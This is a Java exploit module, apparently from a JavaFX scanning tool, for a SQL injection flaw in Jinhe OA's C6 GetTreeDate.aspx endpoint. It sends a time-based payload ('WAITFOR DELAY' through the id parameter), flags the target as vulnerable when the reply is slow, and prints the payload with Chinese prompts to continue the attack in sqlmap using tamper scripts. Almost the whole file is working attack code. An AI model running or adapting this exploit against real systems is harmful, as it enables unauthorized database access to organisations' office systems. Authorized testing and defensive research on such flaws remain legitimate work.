package exp.oa.jinheoa;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.HttpTools_getTime;
import utils.Response;

import java.util.HashMap;

public class jinhe_GetTreeDate_sqli implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea, textArea_cmd);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        Platform.runLater(() -> {
            textArea.appendText("\n 该漏洞为sql注入漏洞，请利用sqlmap进行测试");
        });
        return null;
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {
        try {
            HashMap<String, String> head = new HashMap<>();
            head.put("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0");
            head.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
            long var = HttpTools_getTime.get(url + "/C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1%3bWAITFOR+DELAY+%270%3a0%3a3%27+--%20and%201=1" , head, "utf-8");
            if (var>3000) {
                String target_req = url + "/C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1%3bWAITFOR+DELAY+%270%3a0%3a3%27+--%20and%201=1";
                Platform.runLater(() -> {
                    textArea.appendText("\n [ jinhe_GetTreeDate_sqli ]");
                    textArea.appendText("\n 在sqlmap中使用tamper脚本进行测试");
                    textArea.appendText("\n 敏感信息页面: "+url + "/C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1");
                    textArea.appendText("\n");
                });
                Platform.runLater(() -> {
                    textArea_cmd.appendText("\n----------------------------------------------------------------------\n"+
                            "\npayload:\n"+target_req +
                            "\n----------------------------------------------------------------------\n"+
                            "\n延时时间: "+var+"毫秒\n----------------------------------------------------------------------\n");
                });

                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }
}
